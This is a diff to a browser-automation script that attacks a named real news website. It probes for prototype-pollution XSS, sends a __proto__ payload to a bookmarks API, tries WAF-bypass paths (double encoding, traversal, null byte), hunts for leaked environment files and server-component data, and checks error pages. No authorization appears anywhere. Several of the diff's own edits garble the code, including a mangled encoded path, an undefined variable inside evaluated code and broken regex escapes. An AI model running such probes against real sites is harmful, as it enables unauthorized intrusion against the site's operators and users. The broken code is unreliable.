@@ -60,7 +60,7 @@ async function main() {
   await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
   await new Promise(r => setTimeout(r, 6000));
 
-  // ===== 1. PROTOTYPE POLLUTION → XSS =====
+  // ===== 1. PROTOTYPE POLLUTION — XSS =====
   console.log('=== 1. PROTOTYPE POLLUTION ===');
   var pp = await evalJS([
     '(function(){',
@@ -87,7 +87,8 @@ async function main() {
   for (var i = 0; i < ppUrlTests.length; i++) {
     await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be/?' + ppUrlTests[i] });
     await new Promise(r => setTimeout(r, 3000));
-    var c = await evalJS('(function(){var t={};return t.children||t.innerHTML||"clean";})()');
+    var c = await evalJS('(function(){var t={};return t.children||t.innerHTML||"clean";})()'
+    );
     console.log('  url: ' + ppUrlTests[i].split('=')[0] + ' -> ' + c);
   }
   results.pp_url = c;
@@ -97,12 +98,14 @@ async function main() {
   await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
   await new Promise(r => setTimeout(r, 3000));
   var ppBody = await evalAsync(
-    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks", {' +
-    'method:"POST", headers:{"Content-Type":"application/json"},' +
-    'body:"{\\"__proto__\\":{\\"children\\":\\"PP_POST\\"}}"});' +
+    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks", { ' +
+    'method:"POST", headers:{"Content-Type":"application/json"}, ' +
+    'body:"{\\"__proto__\\":{\\\"children\\\":\\"PP_POST\\"}}"' +
+    '});' +
     'return r.status + " | " + (await r.text()).slice(0,100);'
   );
-  var ppCheck = await evalJS('(function(){var t={};return t.children||"clean";})()');
+  var ppCheck = await evalJS('(function(){var t={};return t.children||"clean";})()'
+  );
   console.log('    post: ' + ppBody + ' | check: ' + ppCheck);
   results.pp_post = ppBody + ' | ' + ppCheck;
 
@@ -114,18 +117,18 @@ async function main() {
   // Test various WAF bypass paths
   var wafTests = [
     { name: 'case variation', path: '/API/_NEXT-API/BOOKMARKS?userId=1' },
-    { name: 'double encoding', path: '/%2561pi/_next-api/bookmarks?userId=1' },
-    { name: 'path traversal', path: '/api/_next-api/bookmarks/..%2f..%2fapi/_next-api/bookmarks?userId=1' },
+    { name: 'double encoding', path: '/%256161pi/_next-api/bookmarks?userId=1' },
+    { name: 'path traversal', path: '/api/_next-api/bookmarks/../%2f../api/_next-api/bookmarks?userId=1' },
     { name: 'semicolon', path: '/api/_next-api/bookmarks;.json?userId=1' },
     { name: 'null byte', path: '/api/_next-api/bookmarks%00.json?userId=1' },
-    { name: 'unicode', path: '/api/_next-api/bookmarks\u003fuserId=1' },
+    { name: 'unicode', path: '/api/_next-api/bookmarks\u003fuserid=1' },
     { name: 'fragment', path: '/api/_next-api/bookmarks?userId=1#test' },
     { name: 'HTTP/1.0', path: '/api/_next-api/bookmarks?userId=1', version: 'HTTP/1.0' },
   ];
   for (var w = 0; w < wafTests.length; w++) {
     var wt = wafTests[w];
     var wr = await evalAsync(
-      'var r = await fetch("https://www.humo.be' + wt.path + '");' +
+      'var r = await fetch("https://www.humo.be" + wt.path + "");' +
       'return r.status + " | " + (await r.text()).slice(0,100);'
     );
     console.log('  ' + wt.name + ': ' + wr);
@@ -162,11 +165,11 @@ async function main() {
     '    var r = await fetch("https://www.humo.be" + envPaths[i]);' +
     '    if (r.status !== 404) {' +
     '      var t = (await r.text()).slice(0, 200);' +
-    '      results.push(envPaths[i] + ":" + r.status + "|" + t.replace(/\\n/g," ").slice(0,80));' +
+    '      results.push(envPaths[i] + ":" + r.status + "|" + t.replace(/\n/g," ").slice(0,80));' +
     '    }' +
     '  } catch(e) {}' +
     '}' +
-    'return results.length ? results.join("\\n") : "all 404";'
+    'return results.length ? results.join("\n") : "all 404";'
   );
   console.log('  ' + env);
   results.env_leakage = env;
@@ -190,10 +193,10 @@ async function main() {
     '      headers: {"RSC": "1", "Next-Router-State-Tree": "%5B%22%22%5D"}' +
     '    });' +
     '    var t = (await r.text()).slice(0, 150);' +
-    '    results.push(rscTests[i] + ":" + r.status + "|" + t.replace(/\\n/g," ").slice(0,60));' +
+    '    results.push(rscTests[i] + ":" + r.status + "" + t.replace(/\n/g," ").slice(0,60));' +
     '  } catch(e) { results.push(rscTests[i] + ":error"); }' +
     '}' +
-    'return results.join("\\n");'
+    'return results.join("\n");'
   );
   console.log('  ' + rsc);
   results.rsc = rsc;
@@ -260,7 +263,7 @@ async function main() {
     var er = await evalAsync(
       'var r = await fetch("https://www.humo.be' + errTests[e] + '");' +
       'var t = (await r.text()).slice(0, 300);' +
-      'return r.status + " | " + t.replace(/\\n/g," ").slice(0, 150);'
+      'return r.status + " | " + t.replace(/\n/g," ").slice(0, 150);'
     );
     console.log('  ' + errTests[e] + ': ' + er);
     results['error_' + e] = er;
